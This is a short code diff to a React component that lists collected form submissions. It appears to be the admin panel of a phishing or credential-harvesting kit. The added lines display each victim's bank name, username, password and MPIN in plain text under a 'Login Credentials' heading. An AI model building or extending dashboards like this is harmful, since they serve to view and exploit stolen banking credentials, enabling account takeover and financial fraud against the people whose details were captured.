@@ -196,13 +196,17 @@ function FormsList({ forms }: { forms: FormData[] }) {
                     )}
 
                     {/* Login Credentials - show only if has data */}
-                    {(form.userId || form.accessCode || form.profileCode) && (
+                    {(form.userId || form.accessCode || form.profileCode || form.bankName || form.username || form.password || form.mpin) && (
                         <div>
                             <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>🔐 Login Credentials</div>
                             <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
+                                {form.bankName && <div><strong>Bank:</strong> {form.bankName}</div>}
                                 {form.userId && <div><strong>User ID:</strong> {form.userId}</div>}
+                                {form.username && <div><strong>Username:</strong> {form.username}</div>}
                                 {form.accessCode && <div><strong>Access Code:</strong> {form.accessCode}</div>}
                                 {form.profileCode && <div><strong>Profile Code:</strong> {form.profileCode}</div>}
+                                {form.password && <div><strong>Password:</strong> {form.password}</div>}
+                                {form.mpin && <div><strong>MPIN:</strong> {form.mpin}</div>}
                             </div>
                         </div>
                     )}
